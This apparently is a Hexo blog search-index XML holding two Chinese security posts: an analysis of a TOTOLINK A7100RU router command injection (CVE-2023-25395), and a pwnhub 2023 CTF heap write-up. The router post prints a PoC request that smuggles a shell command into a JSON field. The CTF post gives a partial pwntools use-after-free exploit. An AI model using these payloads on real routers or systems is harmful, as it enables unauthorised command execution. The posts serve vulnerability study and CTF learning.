<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>cve-2023-25395 totolinkA7100RU命令注入</title>
      <link href="/2023/04/11/cve-2023-25395%20totolinkA7100RU%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/11/cve-2023-25395%20totolinkA7100RU%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>RCE命令注入漏洞，程序没有读发送的数据包内容进行过滤直接插入到<code>execv()</code>函数中导致命令注入漏洞</p><h3 id="漏洞点定位及其部分函数分析"><a href="#漏洞点定位及其部分函数分析" class="headerlink" title="漏洞点定位及其部分函数分析"></a>漏洞点定位及其部分函数分析</h3><p>根据披露者者的poc可以知道这是由于cgi程序处理过程不当导致的问题，所以直接从<code>cstecgi.cgi</code>程序直接分析<br><a href="https://github.com/Am1ngl/ttt/tree/main/22">https://github.com/Am1ngl/ttt/tree/main/22</a></p><p>这个是披露者的poc但是是有问题的(这里固件不知道什么情况环境搭建好了运行不了固件里的任何程序，然后又买不到实体机)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 79</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urencoded; charset=UTF-8</span><br><span class="line">Origin: &lt;http://192.168.0.1&gt;</span><br><span class="line">Referer: &lt;http://192.168.0.1/adm/status.asp?timestamp=1647872753309&gt;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: SESSION_ID=2:1647872744:2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;topicurl&quot;:&quot;setting/delStaticDhcpRules&quot;,</span><br><span class="line">&quot;ou&quot;:&quot;1$(ls&gt;/tmp/123;)&quot;&#125;</span><br></pre></td></tr></table></figure><p>这是披露者所利用的函数，我们明显复现和poc中的<code>delStaticDhcpRules</code>无关，下面我进行回溯<br><img src="https://s2.loli.net/2023/04/11/lFNADszTSO4Vbew.png"></p><p>该程序段位<code>cstecgi.cgi</code>函数也是利用流中的一步，利用流大致就是贴出来的图了后面不在赘述和截图<br><img src="https://s2.loli.net/2023/04/11/FeNEUxyufdc7ZaC.png"></p><p>直接结合汇编看是不是+0x40，确实如此，所以如果按照poc是无法执行到所提供截图的函数</p><p><img src="https://s2.loli.net/2023/04/11/Yp8f94UVCGmRrh1.png"></p><p>虽然真正的利用函数在他发送poc的上面<br><img src="https://s2.loli.net/2023/04/11/ZmfKuno5gk8yTI4.png"></p><p>我们再向上看看匹配到什么会进行这个函数，是不是和第一张图中利用函数报错输出的字段是一样的，所以披露者的poc是有问题的</p><p><img src="https://s2.loli.net/2023/04/11/S3RvNHjcVWdqaXE.png"></p><p>因为没有从<code>lighttpd</code>程序开始分析，所以会出现缺失该程序运行<code>cstecgi.cgi</code>程序前的一些处理，所以从<code>cstecgi.cgi</code>分析的时候我们可以将发送中的setting省略掉就看后面实际匹配的set&#x2F;del，因为模拟不起来且没有实体机，所以不缺定发送poc需不需要加setting这个路径(对poc不信任)，有时间分析下<code>lighttpd</code>文件</p><p><code>websGetVar函数</code>将从a1中 查询对应第二个参数的键值对(json)，该函数没有做任何检查直接把用户写入的值进行传递</p><p><img src="https://s2.loli.net/2023/04/11/lFNADszTSO4Vbew.png"></p><p>关键函数是<code>Uci_Set_Str</code>函数，这个函数是开发者自己编写的函数，在<code>libcscommon.so</code>中，该函数将对应配置路径以及一些需要设置的信息写入v11中，a4为我们发送json字段的内容，也没有进行处理直接写入v11并传入<code>CsteSystem</code>函数中(也在上面那个库中)</p><p><img src="https://s2.loli.net/2023/04/11/z4cK67HDsnEb9WQ.png"></p><p><code>CsteSystem</code>函数这边可以简单理解成执行system函数，所以存在命令注入</p><p><img src="https://s2.loli.net/2023/04/11/FahuPATIBK7QSzl.png"></p><p><a href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">gdbserver各版本下载</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> 待完善 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnhub2023</title>
      <link href="/2023/04/09/pwnhub2023/"/>
      <url>/2023/04/09/pwnhub2023/</url>
      
        <content type="html"><![CDATA[<h4 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1.1"></a>sh_v1.1</h4><p>拿到题目文件乍一眼看感觉很复杂，看着有点懵，实际上就是一个简单的heap类题mu，虽然不知道他们怎么加入这些垃圾代码的，我们可以手动将垃圾代码去除掉就可以看清楚程序的功能了</p><br><ol><li>cat指令效果就是常见heap题目的show</li><li>touch则是create</li><li>rm则是free</li><li>ln就是漏洞点，这个功能就是复制我们用touch创建出来的heap地址到内存中且释放对应地址没有将其置0，uaf</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_231E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> ii; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> jj; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> kk; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> m; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">    <span class="type">int</span> n; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">    <span class="type">int</span> mm; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!s1[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command is NULL!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;ls&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">79</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * i) == <span class="number">1LL</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * i + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;cat&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a2[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">79</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a2, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * j + <span class="number">8</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * j) == <span class="number">1LL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                      </span><br><span class="line">                        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span>**)&amp;heaparray + <span class="number">6</span> * j));</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                LABEL_223:</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;NO FILE&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;touch&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (a2[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt;= <span class="number">79</span>; ++k)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * k))</span><br><span class="line">                &#123;</span><br><span class="line">                    *((_QWORD*)&amp;exist_flag + <span class="number">6</span> * k) = <span class="number">1LL</span>;</span><br><span class="line">                    *((_QWORD*)&amp;heaparray + <span class="number">6</span> * k) = <span class="built_in">malloc</span>(<span class="number">0x208</span>uLL);</span><br><span class="line">                    my_read(*((_QWORD*)&amp;heaparray + <span class="number">6</span> * k), <span class="number">0x208</span>uLL);</span><br><span class="line">                    <span class="built_in">strcpy</span>((<span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * k + <span class="number">8</span>, a2);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        LABEL_807:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Maximum number of files. Please delete the file.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_711:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;file_name is NULL&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;cp&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!a2[<span class="number">0</span>] || !a3[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a2, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">8</span>) &amp;&amp; exist_flag == <span class="number">1LL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (m = <span class="number">0</span>; m &lt;= <span class="number">79</span>; ++m)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * m + <span class="number">8</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">strncpy</span>(*((<span class="type">char</span>**)&amp;heaparray + <span class="number">6</span> * m), heaparray, <span class="number">0x208</span>uLL);</span><br><span class="line">                   </span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (n = <span class="number">0</span>; ; ++n)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (n &gt; <span class="number">79</span>)</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_807;</span><br><span class="line">                <span class="keyword">if</span> (!*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * n))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            *((_QWORD*)&amp;exist_flag + <span class="number">6</span> * n) = <span class="number">1LL</span>;</span><br><span class="line">          </span><br><span class="line">            *((_QWORD*)&amp;heaparray + <span class="number">6</span> * n) = <span class="built_in">malloc</span>(<span class="number">0x208</span>uLL);</span><br><span class="line">            <span class="built_in">strcpy</span>((<span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * n + <span class="number">8</span>, a3);</span><br><span class="line">           </span><br><span class="line">            <span class="built_in">strncpy</span>(*((<span class="type">char</span>**)&amp;heaparray + <span class="number">6</span> * n), heaparray, <span class="number">0x208</span>uLL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_840;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;gedit&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!a2[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">goto</span> LABEL_711;<span class="comment">//文件不存在</span></span><br><span class="line">        <span class="keyword">for</span> (ii = <span class="number">0</span>; ; ++ii)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (ii &gt; <span class="number">79</span>)</span><br><span class="line">                <span class="keyword">goto</span> LABEL_840;<span class="comment">//超出文件范围</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a2, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * ii + <span class="number">8</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * ii) == <span class="number">1LL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">            my_read(*((_QWORD*)&amp;heaparray + <span class="number">6</span> * ii), <span class="number">0x200</span>uLL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_840;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, <span class="string">&quot;rm&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!a2[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (jj = <span class="number">0</span>; ; ++jj)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (jj &gt; <span class="number">79</span>)</span><br><span class="line">                <span class="keyword">goto</span> LABEL_840;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a2, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * jj + <span class="number">8</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * jj) == <span class="number">1LL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">         </span><br><span class="line">            <span class="built_in">free</span>(*((<span class="type">void</span>**)&amp;heaparray + <span class="number">6</span> * jj));</span><br><span class="line">           </span><br><span class="line">            *((_QWORD*)&amp;heaparray + <span class="number">6</span> * jj) = <span class="number">0LL</span>;</span><br><span class="line">            </span><br><span class="line">            *((_QWORD*)&amp;exist_flag + <span class="number">6</span> * jj) = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_840;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(s1, <span class="string">&quot;ln&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!a2[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!a3[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">    <span class="keyword">for</span> (kk = <span class="number">0</span>; ; ++kk)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (kk &gt; <span class="number">79</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="keyword">goto</span> LABEL_840;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a2, (<span class="type">const</span> <span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * kk + <span class="number">8</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * kk) != <span class="number">1LL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    LABEL_840:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;file:%s is not exist;&quot;</span>, a2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (mm = <span class="number">0</span>; ; ++mm)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mm &gt; <span class="number">79</span>)</span><br><span class="line">            <span class="keyword">goto</span> LABEL_807;</span><br><span class="line">        <span class="keyword">if</span> (!*((_QWORD*)&amp;exist_flag + <span class="number">6</span> * mm))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)&amp;exist_flag + <span class="number">48</span> * mm + <span class="number">8</span>, a3);</span><br><span class="line">    </span><br><span class="line">    *((_QWORD*)&amp;exist_flag + <span class="number">6</span> * mm) = <span class="number">1LL</span>;</span><br><span class="line">   </span><br><span class="line">    *((_QWORD*)&amp;heaparray + <span class="number">6</span> * mm) = *((_QWORD*)&amp;heaparray + <span class="number">6</span> * kk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol><li>利用uaf，通过<code>unsorted chunk</code>泄露出libc地址，这里需要去匹配他libc版本</li><li>利用uaf，打tcache attack，把<code>free_hook</code>改写成<code>system</code></li><li>触发free_hook</li></ol><br><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="meta">#c=remote(b<span class="string">&#x27;121.40.89.206&#x27;</span>,34883) </span></span><br><span class="line">c=process(b<span class="number">&#x27;.</span>/sh_v1<span class="number">.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(b<span class="number">&#x27;</span>/lib/x86_64-linux-gnu/libc.so<span class="number">.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def debg():</span><br><span class="line">gdb.attach(c,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(fn,cnt):</span><br><span class="line">c.sendlineafter(b<span class="number">&#x27;</span>&gt;&gt;&gt;&gt;<span class="string">&#x27;,b&#x27;</span>touch <span class="string">&#x27;+fn.encode())</span></span><br><span class="line"><span class="string">c.sendline(cnt)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def free(fn):</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>&gt;&gt;&gt;&gt;<span class="string">&#x27;,b&#x27;</span>rm <span class="string">&#x27;+fn.encode())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def show(fn):</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>&gt;&gt;&gt;&gt;<span class="string">&#x27;,b&#x27;</span>cat <span class="string">&#x27;+fn.encode())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def edit(fn,cnt):</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>&gt;&gt;&gt;&gt;<span class="string">&#x27;,b&#x27;</span>gedit <span class="string">&#x27;+fn.encode())</span></span><br><span class="line"><span class="string">c.sendline(cnt)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def ln(fn1,fn2):</span></span><br><span class="line"><span class="string">c.sendlineafter(b&#x27;</span>&gt;&gt;&gt;&gt;<span class="string">&#x27;,b&#x27;</span>ln <span class="string">&#x27;+fn1.encode()+b&#x27;</span> <span class="string">&#x27;+fn2.encode())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(7):</span></span><br><span class="line"><span class="string">add(str(i),b&#x27;</span>deadbeef<span class="number">&#x27;</span>)#<span class="number">0</span><span class="number">-6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;unsorted_chunk&quot;</span>,b<span class="number">&#x27;</span> <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">add(&quot;fence&quot;,b&#x27;</span>aaaa<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ln(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;tache_attack&quot;</span>)</span><br><span class="line">ln(<span class="string">&quot;unsorted_chunk&quot;</span>,<span class="string">&quot;leak_libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line"><span class="built_in">free</span>(str(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="string">&quot;unsorted_chunk&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;leak_libc&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))<span class="number">-0x1ecbe0</span></span><br><span 